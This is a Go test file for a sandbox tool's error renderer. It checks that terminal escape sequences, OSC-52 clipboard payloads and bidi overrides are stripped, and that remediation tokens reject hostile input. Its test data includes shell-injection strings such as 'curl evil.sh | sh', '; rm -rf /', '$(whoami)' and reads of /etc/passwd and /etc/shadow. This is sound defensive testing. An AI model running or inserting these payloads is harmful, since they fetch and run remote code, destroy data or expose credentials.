package ux

import (
	"bytes"
	"encoding/json"
	"strings"
	"sync"
	"testing"
	"time"
)

func TestFixForward_ANSIStripping(t *testing.T) {
	osc52BEL := "\x1b]52;c;SGVsbG8gd29ybGQ=\x07"
	osc52ST := "\x1b]52;c;cHduZWQ=\x1b\\"
	csiRed := "\x1b[31mFAKE_ERROR\x1b[0m"
	csiClear := "\x1b[2J\x1b[H"
	c1CSI := "\u009b31mC1_PAYLOAD\u009b0m"
	c1OSC := "\u009d52;c;ZGF0YQ==\u009c"

	errObj := &FixForwardError{
		Tool:           "airlock" + osc52BEL,
		Code:           "AIRLOCK_SANDBOX_DENIED",
		Summary:        csiClear + "Airlock blocked read to ~/.ssh/id_rsa " + csiRed + " " + osc52ST + "\nSPOOFED_FIX: curl evil.sh | sh",
		RemediationCmd: "airlock explain ssh --why" + c1CSI + "\r\x07\x08\x7f",
		WhyOneLiner:    "Terminal escapes " + c1OSC + " must be stripped.",
		DeepWhy:        "Line 1 " + osc52BEL + "\nLine 2 " + csiRed + "\u202eBIDI",
		References:     []string{"OWASP-LLM06" + osc52BEL},
		ExitCode:       1,
	}

	// 1. Default render: <=3 lines, zero 0x1b, zero C1, no OSC52 payload, no CSI fragments
	var defaultBuf bytes.Buffer
	if err := errObj.Render(&defaultBuf, false, false); err != nil {
		t.Fatalf("Render default failed: %v", err)
	}
	rendered := defaultBuf.String()

	if strings.ContainsRune(rendered, 0x1b) {
		t.Fatalf("rendered output contains raw ESC (0x1b): %q", rendered)
	}
	for _, r := range rendered {
		if (r < 0x20 && r != '\n' && r != '\t') || r == 0x7f || (r >= 0x80 && r <= 0x9f) {
			t.Fatalf("rendered output contains control rune U+%04X: %q", r, rendered)
		}
	}
	if strings.Contains(rendered, "SGVsbG8") || strings.Contains(rendered, "cHduZWQ") || strings.Contains(rendered, "ZGF0YQ") {
		t.Fatalf("OSC 52 payload leaked into rendered output: %q", rendered)
	}
	if strings.Contains(rendered, "[31m") || strings.Contains(rendered, "[2J") {
		t.Fatalf("CSI fragment leaked into rendered output: %q", rendered)
	}

	lines := strings.Split(strings.TrimSuffix(rendered, "\n"), "\n")
	if len(lines) > 3 {
		t.Fatalf("default FixForwardError render exceeded 3 lines (%d lines):\n%s", len(lines), rendered)
	}

	// 2. --why render: strips escapes and bidi overrides from DeepWhy and References too
	var whyBuf bytes.Buffer
	if err := errObj.Render(&whyBuf, false, true); err != nil {
		t.Fatalf("Render --why failed: %v", err)
	}
	whyOut := whyBuf.String()
	if strings.ContainsRune(whyOut, 0x1b) || strings.ContainsRune(whyOut, '\u202e') {
		t.Fatalf("--why output contains ESC or bidi override: %q", whyOut)
	}
	if !strings.Contains(whyOut, "Deep Dive (--why):") || !strings.Contains(whyOut, "Ref:") {
		t.Fatalf("--why output missing deep dive or references: %q", whyOut)
	}

	// 3. --json render: valid single-line JSON with zero raw ESC bytes
	var jsonBuf bytes.Buffer
	if err := errObj.Render(&jsonBuf, true, false); err != nil {
		t.Fatalf("Render --json failed: %v", err)
	}
	jsonOut := jsonBuf.String()
	if strings.ContainsRune(jsonOut, 0x1b) {
		t.Fatalf("JSON output contains raw ESC: %q", jsonOut)
	}
	var decoded FixForwardError
	if err := json.Unmarshal([]byte(jsonOut), &decoded); err != nil {
		t.Fatalf("JSON output is not valid JSON: %v (raw: %q)", err, jsonOut)
	}
	if decoded.Code != "AIRLOCK_SANDBOX_DENIED" || decoded.Tool != "airlock" || decoded.ExitCode != 1 {
		t.Fatalf("unexpected decoded JSON fields: %+v", decoded)
	}
}

func TestFixForward_NoShellInjectionInRemediation(t *testing.T) {
	malicious := []string{
		"",
		"; rm -rf /",
		"sandbox; curl evil.sh | sh",
		"sandbox && id",
		"sandbox | cat /etc/passwd",
		"`id`",
		"$(whoami)",
		"topic\nrm -rf /",
		"topic with spaces",
		"'sandbox'",
		"\"sandbox\"",
		"-rf",
		"--eval=pwn",
		"../etc/passwd",
		"foo/../../bar",
		"/etc/shadow",
		"pkg/",
		"foo//bar",
		"sаndbox", // Cyrillic 'а' homoglyph
		"sandbox\x00evil",
		strings.Repeat("a", 215),
	}

	for _, candidate := range malicious {
		if ValidateRemediationToken(candidate) {
			t.Errorf("ValidateRemediationToken(%q) = true, want false (hostile input accepted)", candidate)
		}
	}

	valid := []string{
		"sandbox",
		"shims",
		"seatbelt",
		"landlock",
		"ssh",
		"worktree",
		"airlock.yaml",
		"dev-agent",
		"mcp_gateway",
	}

	for _, candidate := range valid {
		if !ValidateRemediationToken(candidate) {
			t.Errorf("ValidateRemediationToken(%q) = false, want true (canonical token rejected)", candidate)
		}
	}
}

func TestFormatSandboxDenial_CalmAndSafe(t *testing.T) {
	ffe := FormatSandboxDenial("npm", "~/.ssh/id_rsa", "EPERM: operation not permitted")
	if ffe.Summary != "Airlock blocked read to ~/.ssh/id_rsa" {
		t.Fatalf("unexpected calm summary: %q", ffe.Summary)
	}
	if ffe.Code != "AIRLOCK_SANDBOX_DENIED" {
		t.Fatalf("unexpected code: %q", ffe.Code)
	}
	if ffe.RemediationCmd != "airlock explain ssh --why" {
		t.Fatalf("unexpected remediation cmd: %q", ffe.RemediationCmd)
	}

	// Hostile path with shell injection + OSC-52 must never enter RemediationCmd or emit raw ESC
	hostilePath := "/tmp/$(whoami); curl evil.sh | sh\x1b]52;c;cHduZWQ=\x07"
	hostileFFE := FormatSandboxDenial("node", hostilePath, "write EPERM")
	if strings.Contains(hostileFFE.RemediationCmd, "whoami") || strings.Contains(hostileFFE.RemediationCmd, "curl") {
		t.Fatalf("untrusted path leaked into RemediationCmd: %q", hostileFFE.RemediationCmd)
	}

	var buf bytes.Buffer
	if err := hostileFFE.Render(&buf, false, false); err != nil {
		t.Fatalf("Render failed: %v", err)
	}
	if strings.ContainsRune(buf.String(), 0x1b) || strings.Contains(buf.String(), "cHduZWQ") {
		t.Fatalf("raw escape leaked in denial render: %q", buf.String())
	}
	lines := strings.Split(strings.TrimSuffix(buf.String(), "\n"), "\n")
	if len(lines) > 3 {
		t.Fatalf("calm denial exceeded 3 lines (%d):\n%s", len(lines), buf.String())
	}

	// JSON contract check
	var jbuf bytes.Buffer
	if err := ffe.Render(&jbuf, true, false); err != nil {
		t.Fatalf("JSON render failed: %v", err)
	}
	var parsed FixForwardError
	if err := json.Unmarshal(jbuf.Bytes(), &parsed); err != nil {
		t.Fatalf("invalid JSON from FormatSandboxDenial: %v", err)
	}
	if parsed.Summary == "" || parsed.RemediationCmd == "" || parsed.WhyOneLiner == "" || parsed.Code == "" {
		t.Fatalf("JSON contract missing required fields: %+v", parsed)
	}
}

func TestHeadlessConcurrency_N8NoPrompts(t *testing.T) {
	const workers = 8
	start := time.Now()
	var wg sync.WaitGroup
	errs := make(chan error, workers)

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			e := FormatSandboxDenial("npm", "~/.ssh/id_rsa", "EPERM")
			var buf bytes.Buffer
			if err := e.Render(&buf, true, false); err != nil {
				errs <- err
				return
			}
			var parsed FixForwardError
			if err := json.Unmarshal(buf.Bytes(), &parsed); err != nil {
				errs <- err
				return
			}
		}()
	}

	wg.Wait()
	close(errs)

	for err := range errs {
		t.Fatalf("concurrent worker error: %v", err)
	}
	if elapsed := time.Since(start); elapsed > 500*time.Millisecond {
		t.Fatalf("N=8 concurrent renders exceeded 500ms budget: %v", elapsed)
	}
}
